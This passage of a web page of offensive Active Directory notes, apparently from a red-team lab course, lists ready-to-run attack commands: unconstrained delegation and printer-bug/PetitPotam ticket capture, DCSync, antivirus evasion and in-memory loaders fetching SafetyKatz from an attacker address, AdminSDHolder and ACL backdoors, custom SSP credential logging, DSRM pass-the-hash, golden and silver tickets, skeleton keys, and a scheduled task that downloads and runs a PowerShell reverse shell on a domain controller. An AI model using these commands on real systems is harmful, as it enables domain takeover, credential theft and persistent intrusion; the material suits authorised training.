GENERAL/BASIC OR UNCONSTRAINED DELEGATION: which allows the first hop server to request access
to any service on any computer in the domain.

>>> When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). 
When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
This way the server can reuse the user's TGT to access any other resource as the user

<b>::: DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONSTRAINED DELEGATION ENABLED USING POWERVIEW</b>

PS> Get-DomainComputer -UnConstrained

<b>::: USING Active Directory MODULE</b>

PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}

PS> Get-ADUser -Filter {TrustedForDelegation -eq $True}

- Compromise the server(s) where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.

Now, if the command is run again

PS> Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'

The DA token could be reused

PS> Invoke-Mimikatz -Command '"kerberos::pttC:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

<b>::: PRINTER BUG</b>

A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to 
connect to second a machine of the domain user's choice.

<b> CAPTURE THE TGT OF dcorp-dc$ BY USING RUBEUS ON dcorp-appsrv</b>

reference: (https://github.com/GhostPack/Rubeus) 

PS> Rubeus.exe monitor /interval:5 /nowrap

...and after that run MS-RPRN.exe on the student VM.

reference: (https://github.com/leechristensen/SpoolSample) 

PS> MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local

<b> COPY THE base64 ENCODED TGT, REMOVE EXTRA SPACES (if any) AND USE IT ON THE STUDENT VM</b>

PS> Rubeus.exe ptt /tikcet:

<b> ONCE THE TICKET IS INJECTED, RUN DCSync</b>

PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

<b>::: PETIPOTAM</b>

<b> We can also use PetitPotam.exe on dcorp-appsrv</b>

reference: (https://github.com/topotam/PetitPotam) 

PS> PetitPotam.exe dcorp-appsrv dcorp-dc

On dcorp-appsrv

PS> Rubeus.exe monitor /interval:5

"PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
need credentials when used against a DC"
 
CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
hop server, Windows offers Protocol Transition to transition the request to Kerberos  
</details>	
<details>
<summary>DOMAIN OFFENSIVE.NET AV BYPASS</summary>
<p>DESCRIPTION: </p>
<h3> OFFENSIVE .NET - AV BYPASS: STRING MANIPULATION</h3>

<a href="https://github.com/matterpreter/DefenderCheck">DEFENDER CHECK</a> can be used to detect code and 
strings from a binary that windows defender may flag as malicious.

usage:

PS> DefenderCheck.exe [file]

>>> STRING MANIPULATION

the sample way is to edit the code using an IDE, sample, visual studio.
for example, some triggers are associated to the words "credentials", so the basic way to bypass this 
is replacing the trigger word with another word, sample: "Credents". (remember to replace in all code")
run DefenderCheck until there's no flags. 

<b>::: STRING MANIPULATION for SAFETYKATZ</b> Page 114

1. get latest version of mimikatz & Out-CompressedDll.ps1
2. run the Out-CompressedDll.ps1 powerShell script on Mimikatz binary and save the output to a file.

PS> Out-CompressedDll [Path/to/mimikatz.exe] > outputfilename.txt 

<b>::: BETTERSAFETYKATZ</b> Page 117

<b>::: AV-BYPASS OBFUSCATION (ConfuserEX)</b> Page 119

<b>::: PAYLOAD DELIVERY</b>

The tool "netloader" can be used to deliver the payload

<a href="https://github.com/Flangvik/NetLoader">NETLOADER</a>

<b>::: LOAD BINARY FORM FILEPATH OR URL AND PATCH AMSI & ETW WHILE EXECUTING</b>

PS> C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe

<b>::: USE ASSEMBLYLOAD.EXE THAT CAN BE USED TO LOAD NETLOADER IN MEMORY FROM URL WHICH THEN LOADS A BINARY FROM FILEPATH OR URL</b>

PS> C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe   
</details>
<details>
<summary>DOMAIN OU ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3> DOMAIN OU ENUMERATION WITH POWERSHELL </h3>

<b>-OU-</b>

<b>::: GET OU IN A DOMAIN</b>

PS> Get-DomainOU

PS> Get-ADOrganizationalUnit -Filter * -Properties *

<b>::: GET ATTRIBUTE OF AN OU</b>

PS> (Get-DomainOU -Identity [OU]).attribute

<b>SAMPLE:</b>

PS> (Get-DomainOU -Identity Servers).gplink

<b>::: FILTER NAME ON RESULTS</b>

PS> Get-DomainOU | select -ExpandProperty [name]

<b>::: LIST ALL COMPUTERS IN A SPECIFIC OU</b>

PS> (Get-DomainOU -Identity [OUName]).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

% = means each result (object)  
</details>

<h4>POWERSHELL PERSISTENCE</h4>	
	
<details>
<summary>DOMAIN PERSISTENCE ACL ADMINSDHOLDER</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - ACLs: AdminSDHolder </h3>

Resides in the System container of a domain and used to control the permissions 
-using an ACL - for certain built-in privileged groups (called Protected Groups). 

>> GROUPS

Account Operators | Enterprise Admins | Domain Controllers | Backup Operators | Administrators
Print Operators | Schema Admins | Replicator | Read-Only Domain Controller

Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder
and any differences are overwritten on the object ACL.

<b>::: ACCOUNTS THAT CAN BE ABUSSED</b>

- Account Operators: Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
- Backup Operators: Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
- Server Operators: Run a command as system (using the disabled Browser service)
- PrintOperators: Copy ntds.dit backup, load device drivers.

>> With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism
by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. 
>> In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

<b>::: ADD FULLCONTROL PERMISSIONS FOR A USER TO THE AdminSDHolder USING POWERVIEW AS DA</b>

PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 
-Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

Using ActiveDirectoryModule and RACE toolkit (https://github.com/samratashok/RACE) :

PS> Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -RightGeneric All 
-DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose

<b>::: OTHER INTERESTING PERMISSIONS (ResetPassword, WriteMembers) FOR A USER TO THE AdminSDHolder</b>

PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 
-Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1
-Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

<b>::: RUN SDProp MANUALLY USING Invoke-SDPropagator.ps1 FROM TOOLS DIRECTORY</b>

PS> Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

<b>::: For pre-Server 2008 machines</b>

PS> Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose

<b>::: CHECK THE DOMAIN ADMINS PERMISSIONS -PowerView AS NORMAL USER</b>

PS> Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_| Add-Member NoteProperty 'IdentityName' 
$(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}

<b>::: USING ACTIVE DIRECTORY MODULE</b>

PS> (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}

<b>::: ABUSING FULL CONTROL USING PowerView</b>

PS> Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

<b>::: USING ACTIVE DIRECTORY MODULE</b>

PS> Add-ADGroupMember -Identity 'Domain Admins' -Members testda

<b>::: ABUSING RESET PASSWORD USING POWERVIEW</b>

PS> Set-DomainUserPassword -Identity testda -AccountPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

<b>::: USING AD MODULE</b>

PS> Set-ADAccountPassword -Identity testda -NewPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose  
</details>
<details>
<summary>DOMAIN PERSISTENCE ACL RIGHTS ABUSE</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - RIGHTS ABUSE </h3>

With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".

<b>::: ADD FULL CONTROL RIGHTS</b>

PS> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 
-RightsAll -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

<b>::: USING ACTIVEDIRECTORYMODULE AND RACE</b>

PS> Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose

<b>::: ADD RIGHTS FOR DCSync</b>

PS> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights 
DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

<b>::: USING ACTIVEDIRECTORYMODULE AND RACE</b>

PS> Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose

<b>::: EXECUTE DCSync</b>

PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

or

PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"  
</details>
<details>
<summary>DOMAIN PERSISTENCE ACL SECURITY DESCRIPTORS</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - SECURITY DESCRIPTORS </h3>

>> Security Descriptor Definition Language defines the format which is used to describe a security descriptor. 
SDDL uses ACE strings for DACL and SACL:

ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid

>> ACE for built-in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;SID

<b>::: USING WMI</b>

Using the RACE toolkit

<b> IMPORT THE MODULE</b>

. C:\AD\Tools\RACE-master\RACE.ps1

<b> ON LOCAL MACHINE FOR student1</b>

PS> Set-RemoteWMI -SamAccountName student1 -Verbose

<b> ON REMOTE MACHINE FOR student1 WITHOUT EXPLICIT CREDENTIALS</b>

PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose

<b> ON REMOTE MACHINE WITH EXPLICIT CREDENTIALS. ONLY root\cimv2 AND NESTED NAMESPACES</b>

PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator –namespace 'root\cimv2' -Verbose

<b> ON REMOTE MACHINE REMOVE PERMISSIONS</b>

PS> Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Remove -Verbose

<b>::: USING POWERSHELL REMOTING</b>

<b> ON LOCAL MACHINE FOR student1</b>

PS> Set-RemotePSRemoting -SamAccountName student1 -Verbose

<b> ON REMOTE MACHINE FOR student1 WITHOUT CREDENTIALS</b>

PS> Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose

<b> ON REMOTE MACHINE, REMOVE THE PERMISSIONS</b>

PS> Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove

<b>::: USING REMOTE REGISTRY</b>

<b> USING RACE or DAMP, WITH ADMIN PRIVSON REMOTE MACHINE</b>

PS> Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose

<b> AS student1, RETRIEVE MACHINE ACCOUNT HASH</b>

PS> Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

<b> RETRIEVE LOCAL ACCOUNT HASH</b>

PS> Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

<b> RETRIEVE DOMAIN CACHED CREDENTIALS</b>

PS> Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose  
</details>
<details>
<summary>DOMAIN PERSISTENCE CUSTOMSSP</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - CUSTOM SSP </h3>

"is a DLL which provides ways for an application to obtain an authenticated connection"

Sample: NTLM | Kerberos | Wdigest | CredSSP

Mimikatz provides a custom SSP -mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.

>> Two ways:

<b>::: .DLL</b>

Process: drop the mimilib.dll to system32 and add mimilib to "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security"

PS> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

PS> $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value 

PS> $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

<b>::: INJECT INTO LSASS USING MIMIKATZ</b>

PS> Invoke-Mimikatz -Command '"misc::memssp"'

NOTE: local logons are logged on the following file
C:\Windows\system32\kiwissp.log  
</details>
<details>
<summary>DOMAIN PERSISTENCE DSMR</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - DSMR </h3>

"Directory Services Restore Mode"

- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

<b>::: DUMP DSRM PASSWORD (needs DA privs)</b>

PS> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

<b>::: COMPARE THE "ADMINISTRATOR" HASH WITH THE ADMINISTRATOR HASH OF BELOW COMMAND</b>

PS> Invoke-Mimikatz -Command '"lsadump::lsa/patch"' -Computername dcorp-dc

Page 148

Since it is the local administrator of the DC, we can pass the hash to authenticate. 
But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash.

PS> Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" 
-Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

<b>::: PASS THE HASH</b>

PS> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

PS> ls \\dcorp-dc\C$  
</details>
<details>
<summary>DOMAIN PERSISTENCE GOLDEN</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - GOLDEN TICKET</h3>

<b>::: GET KRBTGT HASH</b>

- Execute mimikatz on DC as DA to get krbtgt hash

PS> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc 

- On any machine

PS> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
/krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

Page 130

<b>::: USING DSYNC</b>

To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges 
(or a user that has replication rights on the domain object)

PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  
</details>
<details>
<summary>DOMAIN PERSISTENCE SILVER</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - SILVER TICKET</h3>

A valid TGS (Golden ticket is TGT).
Encrypted and signed by the hash of the service account (golden ticket is signed by hash of krbtgt) of the service running with that account.
Services rarely check PAC (Privileged Attribute Certificate). 
Services will allow access only to the services themselves.
Reasonable persistence period (default 30 days for computer accounts).

<b>::: USING HASH OF THE DOMAIN CONTROLLER COMPUTER ACCOUNT, BELOW COMMAND PROVIDES ACCESS TO SHARES ON THE DC.</b>

PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
/target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'

NOTE: this same command can be applied for more services, (HTTP, HOST & more)

<b>::: CREATE A SILVER TICKET FOR THE HOST SPN WHICH WILL ALLOW US TO SCHEDULE A TASK ON THE TARGET</b>

PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
/target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'

<b>::: SCHEDULE AND EXECUTE A TASK</b>

PS> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
"powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"

PS> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"  
</details>
<details>
<summary>DOMAIN PERSISTENCE SKELETON KEY</summary>
<p>DESCRIPTION: </p>
<h3> PERSISTENCE - SKELETON-KEY </h3>

Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsassprocess) 
so that it allows access as any user with a single password.

<b>::: INJECT A SKELETON KEY (password would be mimikatz) ON A DOMAIN CONTROLLER OF CHOICE. (DA privileges required)</b>

PS> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Now, it is possible to access any machine with a valid username and password as "mimikatz"...

PS> Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator  
</details>
<details>
<summary>REMOTE CONNECTION</summary>
<p>DESCRIPTION: </p>
<h3> REMOTE CONNECTION USING POWERSHELL </h3>

<b>:::CONNECT TO A REMOTE MACHINE USING WINRS</b>

PS> winrs -r:[hostname] [command]
PS> winrs -r:CVS-SRV001 cmd

<b>:::CONNECT TO A REMOTE MACHINE USING POWERSHELL-REMOTING</b>

PS> Enter-PSSession -ComputerName [FQDN]  
</details>
</div>
</pre>
<button onclick="document.location='/machete/offensive/penetration_testing/AD_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023.</p>
</center>
</body>
</html>
